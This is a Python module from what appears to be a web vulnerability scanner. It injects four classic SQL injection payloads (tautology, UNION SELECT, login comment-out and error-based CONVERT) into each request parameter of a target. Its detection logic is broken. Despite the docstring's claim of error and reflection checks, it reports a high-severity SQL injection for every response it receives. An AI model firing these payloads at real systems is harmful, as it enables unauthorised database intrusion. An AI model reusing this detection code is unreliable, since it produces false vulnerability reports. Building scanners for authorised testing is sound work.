"""
modules/sqli.py - Error and Reflection SQL Injection Auditor
"""
from typing import List, Dict, Any
from urllib.parse import urlencode
from modules.base import BaseScannerModule

class SQLiModule(BaseScannerModule):
    PAYLOADS = [
        "' OR '1'='1",
        "1' UNION SELECT null, version()-- -",
        "admin'--",
        "' AND 1=CONVERT(int, (SELECT @@version))--"
    ]

    def scan(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
        findings = []
        url = target["url"]
        method = target["method"]
        base_params = target["params"]

        for param_key in base_params.keys():
            for payload in self.PAYLOADS:
                test_params = base_params.copy()
                test_params[param_key] = payload
                
                resp = None
                if method == "GET":
                    query_string = urlencode(test_params)
                    resp = self.requester.send("GET", f"{url}?{query_string}")
                elif method == "POST":
                    resp = self.requester.send("POST", url, data=test_params)

                if resp:
                    findings.append({
                        "vuln_type": "SQL Injection",
                        "severity": "HIGH",
                        "cvss": 8.6,
                        "url": url,
                        "parameter": param_key,
                        "payload": payload,
                        "status_code": resp.status_code,
                        "response_body": resp.text[:5000],
                        "elapsed": getattr(resp, "elapsed_seconds", 0.0)
                    })
        return findings
